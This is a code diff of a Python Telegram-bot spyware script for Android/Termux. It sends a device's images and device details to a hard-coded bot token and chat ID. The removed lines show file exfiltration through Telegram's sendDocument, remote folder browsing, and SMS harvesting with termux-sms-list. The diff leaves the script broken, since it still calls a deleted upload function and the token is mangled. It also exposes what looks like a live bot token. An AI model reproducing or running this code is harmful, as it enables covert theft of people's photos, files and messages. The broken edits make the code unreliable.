@@ -3,9 +3,10 @@ import requests
 import json
 import subprocess
 from threading import Thread, Event
+import time  # Add delay handling
 
 # Replace with your bot token and chat ID
-TOKEN = '7409833692:AAEHa57FWspcNNFqPlPlvVwrZDcikh2bQmw'
+TOKEN = '7409833692:7409833692:AAEHa57FWspcNNFqPlPlvVwrZDcikh2bQmw'
 CHAT_ID = '6285177516'
 
 # Global variable to store current folder path and download state
@@ -28,24 +29,6 @@ def send_to_telegram(message):
             print(f"Failed to send message. Status code: {response.status_code}, Response: {response.text}")
     except Exception as e:
         print(f"Error sending message: {str(e)}")
-
-# Function to send a file to Telegram
-def send_file_to_telegram(file_path):
-    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
-    try:
-        with open(file_path, 'rb') as file:
-            files = {'document': file}
-            data = {"chat_id": CHAT_ID}
-            response = requests.post(url, files=files, data=data)
-            if response.status_code == 200:
-                print(f"File {file_path} sent successfully!")
-                send_to_telegram(f"File `{os.path.basename(file_path)}` sent successfully!")
-            else:
-                print(f"Failed to send file. Status code: {response.status_code}, Response: {response.text}")
-                send_to_telegram(f"Failed to send file `{os.path.basename(file_path)}`. Status code: {response.status_code}")
-    except Exception as e:
-        print(f"Error sending file {file_path}: {str(e)}")
-        send_to_telegram(f"Error sending file `{os.path.basename(file_path)}`: {str(e)}")
 
 # Function to download images from specified locations
 def download_images():
@@ -77,45 +60,6 @@ def download_images():
                     
                     downloaded_files.add(file_path)
                     send_file_to_telegram(file_path)
-
-# Function to handle folder navigation
-def handle_folder_navigation(folder_name):
-    global current_folder
-    try:
-        # Update the current folder path
-        new_folder_path = os.path.join(current_folder, folder_name)
-        
-        if os.path.isdir(new_folder_path):
-            current_folder = new_folder_path
-            file_list = os.listdir(current_folder)
-            if file_list:
-                file_list_message = f"*Contents of `{current_folder}`:*\n"
-                file_list_message += "\n".join([f"`{file}`" for file in file_list])
-                file_list_message += "\n\nSend the file name to download it, or folder name to navigate."
-                send_to_telegram(file_list_message)
-            else:
-                send_to_telegram("No files or folders found.")
-        else:
-            send_to_telegram(f"`{folder_name}` is not a valid folder.")
-    except Exception as e:
-        send_to_telegram(f"Error navigating folder: {str(e)}")
-
-# Function to get SMS details
-def get_sms():
-    try:
-        result = subprocess.run(['termux-sms-list'], stdout=subprocess.PIPE, check=True)
-        sms_list = json.loads(result.stdout.decode('utf-8'))
-        if sms_list:
-            messages = []
-            for sms in sms_list:
-                sender = sms.get('sender', 'Unknown')
-                message = sms.get('body', '')
-                messages.append(f"From: {sender}\nMessage: {message}\n")
-            return "\n".join(messages)
-        else:
-            return "No SMS messages found."
-    except Exception as e:
-        return f"Error retrieving SMS: {str(e)}"
 
 # Function to get device information
 def get_device_info():
@@ -151,28 +95,6 @@ def get_device_info():
         return info_message
     except Exception as e:
         return f"Error retrieving device info: {str(e)}"
-
-# Function to download a specific file
-def download_file(file_name):
-    try:
-        file_path = os.path.join(current_folder, file_name)
-        
-        if os.path.isfile(file_path):
-            # Send the file to Telegram
-            url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
-            with open(file_path, 'rb') as file:
-                files = {'document': file}
-                data = {"chat_id": CHAT_ID}
-                response = requests.post(url, files=files, data=data)
-                
-            if response.status_code == 200:
-                return f"File `{file_name}` sent successfully!"
-            else:
-                return f"Failed to send file. Status code: {response.status_code}, Response: {response.text}"
-        else:
-            return f"File `{file_name}` does not exist or is not a valid file."
-    except Exception as e:
-        return f"Error downloading file: {str(e)}"
 
 # Function to handle Telegram commands for downloading photos and stopping downloads
 def handle_telegram_update(update):
@@ -236,9 +158,13 @@ def listen_for_updates():
             for update in updates:
                 last_update_id = update.get('update_id')
                 handle_telegram_update(update)
+            
+            # Adding a short delay to prevent continuous requests and overloading
+            time.sleep(2)
 
         except Exception as e:
             send_to_telegram(f"Error listening for updates: {str(e)}")
+            time.sleep(5)  # In case of an error, wait before retrying
 
 # Start listening for Telegram updates
 if __name__ == "__main__":
